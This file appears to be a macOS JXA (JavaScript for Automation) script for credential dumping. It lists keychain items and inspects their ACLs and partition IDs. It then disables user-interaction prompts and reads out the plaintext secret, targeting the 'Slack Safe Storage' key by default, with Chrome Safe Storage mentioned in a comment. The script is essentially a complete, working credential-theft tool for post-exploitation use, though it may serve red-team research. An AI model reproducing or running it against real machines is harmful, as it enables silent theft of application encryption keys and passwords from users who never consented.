ObjC.import("Security");
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);

function hex2a(hexx) {
	var hex = hexx.toString();//force conversion
	var str = '';
	for (var i = 0; i < hex.length; i += 2)
	    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
	return str;
}

print_acls = function(accessRights, acl_c, range, keychainItem){
	let userId = Ref();
	let groupId = Ref();
	let ownerType = Ref();
	let ownerACLS = Ref();
	$.SecAccessCopyOwnerAndACL(accessRights, userId, groupId, ownerType, ownerACLS);
	if(ownerType[0] !== 0){
		console.log("userid: " + userId[0] + "\ngroupid: " + groupId[0] + "\nownertype: " + ownerType[0]);
	} else {
		console.log("\tOwnership determined by partitionID");
	}
	auth_c = $.CFMakeCollectable(ownerACLS[0]);
	if(auth_c.js !== undefined){
		console.log("Owner Authorizations:");
		for(let j = 0; j < parseInt($.CFArrayGetCount(auth_c)); j++){
			authz = auth_c.objectAtIndex(j);
			console.log("\t" + authz.js);
		}
	}else{
		console.log("\tNo Authorizations")
	}
	let hasNecessaryPartitionIDs = false;
    let hasPartitionIDSet = false;
    let hasNecessaryAuthorizationsAndIsTrustedApplication = false;
    let hasNecessaryAuthorizationsAndAllApplicationsTrusted = false;
    if(range === 0){
    	hasNecessaryPartitionIDs = true;
    	hasPartitionIDSet = true;
    	hasNecessaryAuthorizationsAndIsTrustedApplication = true;
    	hasNecessaryAuthorizationsAndAllApplicationsTrusted = true;
    }
	for(let i = 0; i < range; i++){
		let perACLIsTrustedApplication = false;
        let perACLHasNecessaryAuthorizations = false;
        let perACLAllApplicationsTrusted = false;
		let acl1 = acl_c.objectAtIndex(i);
		let application_list = Ref();
		let description = Ref();
		let keychainPromptSelector = Ref();
		$.SecACLCopyContents(acl1, application_list, description, keychainPromptSelector);
		description_c = $.CFMakeCollectable(description[0]); // $("Chrome Safe Storage")
		console.log("---------------------------------------------------");
		if(description_c.js.startsWith("3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a")){
			// we're looking at the PartitionID PLIST
			// 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a
            // is "<?xml version="1.0" encoding="UTF-8"?>" which means we're looking at a plist for the description
            let plistString = hex2a(description_c.js);
            let format = $.NSPropertyListXMLFormat_v1_0;
            let partitionPlist = $.NSPropertyListSerialization.propertyListWithDataOptionsFormatError($(plistString).dataUsingEncoding($.NSUTF8StringEncoding), $.NSPropertyListImutable, $.NSPropertyListXMLFormat_v1_0, $.nil);
            if(partitionPlist.objectForKey("Partitions")){
            	let partitions = ObjC.deepUnwrap(partitionPlist.objectForKey("Partitions"));
            	console.log("\tAllowed Code Signatures: ", partitions);
            	
            }
		}
		console.log("\tDescription of ACL: " + description_c.js);
		application_list_c = $.CFMakeCollectable(application_list[0]);
		if(application_list_c.js !== undefined){
			let app_list_length = parseInt($.CFArrayGetCount(application_list_c));
			if(app_list_length === 0){
				console.log("\tNo trusted applications");
			}
			for(let j = 0; j < app_list_length; j++){
				secapp = application_list_c.objectAtIndex(j);
				secapp_c = Ref();
				$.SecTrustedApplicationCopyData(secapp, secapp_c);
				secapp_data = $.CFMakeCollectable(secapp_c[0]);
				sec_string = $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithBytesLength(secapp_data.bytes, secapp_data.length), $.NSUTF8StringEncoding);
				console.log("\tTrusted App: " + sec_string.js);
			}
		} else {
			console.log("\tAll applications trusted");
		}
		auth = $.SecACLCopyAuthorizations(acl1);
		auth_c = $.CFMakeCollectable(auth);
		if(auth_c.js !== undefined){
			console.log("\tAuthorizations:");
			for(let j = 0; j < parseInt($.CFArrayGetCount(auth_c)); j++){
				authz = auth_c.objectAtIndex(j);
				console.log("\t\t" + authz.js);
				//if( (authz.js.includes("ACLAuthorizationExportClear") || authz.js.includes("ACLAuthorizationAny") ) && application_list_c.js === undefined){
				if( authz.js.includes("ACLAuthorizationExportClear") || authz.js.includes("ACLAuthorizationAny")){
					//console.log("\t\tApplication list is nil and there is authorization to export");
					perACLHasNecessaryAuthorizations = true;
				}
			}
		}else{
			console.log("\t\tNo Authorizations")
		}
		
	}
	$.SecKeychainSetUserInteractionAllowed(false);
	if(true){
		print_password(keychainItem);
	}
}
print_password = function(keychainItem){
	let dataContent = Ref();
	let dataContentLength = Ref();
	let attributeList = Ref();
	status = $.SecKeychainItemCopyContent(keychainItem, 0, attributeList, dataContentLength, dataContent);
	//console.log(status);
	//console.log(dataContentLength[0]);
	if(status === 0){
		let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
		//console.log("\t\t[++++++++] SECRET DATA HERE [++++++++++]")
		//console.log("Base64 of secret data: " + nsdata.base64EncodedStringWithOptions(0).js);
		console.log("Secret Data: ", $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js);
	}else if(status === -25293){
		console.log("Failed to get password - Invalid Username/Password");
	} else {
		console.log("Failed to decrypt with error: " + status);
	}
}
process_query = function(query){
	let items = Ref();
	let status = $.SecItemCopyMatching(query, items);
	if(status === 0){
		let item_o_c = $.CFMakeCollectable(items[0]).js;
		console.log("[+] Successfully searched, found " + item_o_c.length + " items")
		for(let i = 0; i < item_o_c.length; i++){
			let item = item_o_c[i];
			//$.CFShow(item);
			console.log("==================================================");
			console.log("Account:     " + item.objectForKey("acct").js);
			console.log("Create Date: " + item.objectForKey("cdat").js);
			//console.log(item.objectForKey("gena").js);
			console.log("Label:       " + item.objectForKey("labl").js);
			console.log("Modify Date: " + item.objectForKey("mdat").js);
			console.log("Service:     " + item.objectForKey("svce").js);
			console.log("KeyClass:    " + item.objectForKey("class").js);
			if( item.objectForKey("gena").js !== undefined){
				console.log("General:     " + item.objectForKey("gena").base64EncodedStringWithOptions(0).js);
			}

			let access_rights2 = Ref();
			$.SecKeychainItemCopyAccess(item.objectForKey("v_Ref"), access_rights2);
			let acl2 = Ref()
			$.SecAccessCopyACLList(access_rights2[0], acl2)
			range2 = parseInt($.CFArrayGetCount(acl2[0]));
			acl_c2 = $.CFMakeCollectable(acl2[0]);
			print_acls(access_rights2[0], acl_c2, range2, item.objectForKey("v_Ref"));
			// we can get the data and try to decrypt below
			//let dataContent = Ref();
			//let dataContentLength = Ref();
			//let attributeList = Ref();
			//status = $.SecKeychainItemCopyContent(item_o_c, 0, attributeList, dataContentLength, dataContent);
			//console.log(status);
			//console.log(dataContentLength[0]);
			//let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
			//console.log(nsdata.base64EncodedStringWithOptions(0).js);
		}
		
	}else{
		console.log("[-] Failed to search keychain with error: " + status);
	}
}
list_all_key_of_type = function(key_type){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, key_type);
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	//$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanTrue);
	process_query(query);
}
list_all_attr_of_key_by_account = function(account){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassGenericPassword);
	$.CFDictionarySetValue(query, $.kSecAttrAccount, $.CFStringCreateWithCString($.kCFAllocatorDefault, account, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}
list_all_attr_of_key_by_label_genp = function(label){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassGenericPassword);
	$.CFDictionarySetValue(query, $.kSecAttrLabel, $.CFStringCreateWithCString($.kCFAllocatorDefault, label, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}
list_all_attr_of_key_by_label_key = function(label){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassKey);
	$.CFDictionarySetValue(query, $.kSecAttrLabel, $.CFStringCreateWithCString($.kCFAllocatorDefault, label, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}
//list_all_key_of_type($.kSecClassGenericPassword);
//list_all_key_of_type($.kSecClassKey);
//list_all_key_of_type($.kSecClassInternetPassword);
//list_all_key_of_type($.kSecClassCertificate);
//list_all_attr_of_key_by_account("test account");
list_all_attr_of_key_by_label_genp("Slack Safe Storage");